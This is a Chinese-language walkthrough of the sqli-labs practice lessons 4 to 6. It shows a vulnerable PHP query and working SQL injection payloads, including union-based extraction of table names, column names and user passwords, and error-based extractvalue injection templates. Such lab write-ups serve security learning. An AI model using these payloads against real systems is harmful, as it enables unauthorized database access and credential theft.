### sqli-labs/Less-4

输入`1'`没有报错

查看源代码

~~~php
$id = '"' . $id . '"';//拼接"，变量id，"
$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";
~~~

根据源代码可知，输入1'，执行`SELECT * FROM users WHERE id=("1'") LIMIT 0,1`，1'作为字符串被传递。

分析：可用`1")`封闭前面的`'("`，并用`--+`或`%23`将后面的内容注释

后续用联合注入即可。

过程：

* 查字段
  * `1") order by 3--+`
  * ``1") order by 4--+`

* 显位
  * `0") union select 1,2,3--+`
* 联合注入
  * `0") union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+`
  * `0") union select 1,2,group_concat(column_name) from information_schema.columns where table_name="users"--+`
  * `0") union select 1,group_concat(username),group_concat(password) from "users"--+`

### sqli-labs/Less-5

输入`1`显示`you are in……`

输入`1'`报错

使用报错注入`pyload：id=1'and(select extractvalue("anything",concat('~',(select语句))))`

### sqli-labs/Less-6

报错注入

输入`0`无显示内容

输入`1`显示`you are in……`

输入`1"`有报错信息

使用报错注入`pyload：id=1"and(select extractvalue("anything",concat('~',(select语句))))`